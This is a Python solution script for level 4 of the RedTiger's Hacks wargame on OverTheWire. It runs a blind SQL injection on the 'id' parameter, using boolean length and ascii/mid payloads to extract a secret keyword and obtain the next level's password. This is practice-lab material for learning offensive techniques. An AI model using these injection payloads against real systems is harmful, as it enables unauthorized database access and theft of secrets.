#!/usr/bin/env python3
import pickle
import tigers as tg
import tiger_cookies
from connect import my_request as req


def check_func(*args) -> bool:
    '''
    check string in response of request
    args[0]: response
    '''
    return '1 rows' in args[0]


def main():
    '''
    Blind SQL Injection.

    Target: Get the value of the first entry in table level4_secret in column keyword

    Disabled: like
    '''
    base_name = 'level4_secret'
    url = "https://redtiger.labs.overthewire.org/level4.php"
    finds = 'keyword'  # What we are finding
    pass_r = 'The password for the next level is: '
    level = 'level4login'

    cooks = tiger_cookies.check_cookies(level)
    cook = dict(level4login=cooks[level])

    # Find len of key
    payload = f"1 and if((select length({finds}) from {base_name})>%s, 1, 0)"
    param = dict(id=payload)
    len_of_key = tg.find_key_len(url, param, check_func, cook)

    print('key length: ', len_of_key)

    # Find key
    key = tg.find_binary(url,
                         f"1 and if((select ascii(mid({finds},%s,1)) from {base_name}) %s",
                         'id', '1 rows', 32, 126, len_of_key, cook)

    # Authorization
    data = dict(secretword=key, go='Go!')
    response = req.post_request(url, data, cook)

    # Еxtracting data from html
    passw = tg.extract_pass(response, pass_r).replace(pass_r, '')
    print('password:', passw)
    tiger_cookies.save_cookies(cooks, level, passw)


if __name__ == '__main__':
    main()
